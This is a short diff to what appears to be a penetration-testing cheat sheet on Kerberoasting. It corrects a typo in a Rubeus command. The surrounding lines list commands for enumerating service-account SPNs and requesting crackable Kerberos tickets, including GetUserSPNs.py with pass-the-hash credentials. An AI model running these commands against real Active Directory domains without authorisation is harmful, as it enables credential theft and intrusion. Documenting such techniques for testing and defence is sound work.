@@ -52,7 +52,7 @@ GetUserSPNs.py -request -dc-ip 192.168.2.160 -hashes <LMHASH>:<NTHASH> <DOMAIN>/
 # Get Kerberoastable users
 setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
 Get-NetUser -SPN | select serviceprincipalname #Powerview
-.\Rubeus.exe kerberosat /stats
+.\Rubeus.exe kerberoast /stats
 ```
 
 * **Technique 1: Ask for TGS and dump it from memory**
